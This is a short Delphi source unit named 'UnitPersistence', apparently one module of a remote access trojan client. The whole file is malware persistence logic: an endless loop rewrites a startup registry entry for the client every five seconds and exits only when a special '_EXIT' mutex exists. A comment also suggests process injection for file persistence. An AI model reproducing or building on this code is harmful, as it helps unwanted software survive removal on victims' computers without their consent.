unit UnitPersistence; //by wrh1d3

interface

uses
  Windows, UnitConfiguration, UnitRegistryManager, UnitInstallation;

procedure Persistence;

implementation

uses
  UnitConnection;

procedure Persistence;
var
  TmpMutex: THandle;
begin
  while True do
  begin
    if Configuration.Startup = True then CreateStartupValue(ClientFile);
    TmpMutex := CreateMutex(nil, False, Pchar(Configuration.Mutex + '_EXIT')); //signal to stop persistence
    if GetLastError = ERROR_ALREADY_EXISTS then Break else CloseHandle(TmpMutex);
    Sleep(5000);
  end;

  //file persistence can be done by process injection...
end;

end.
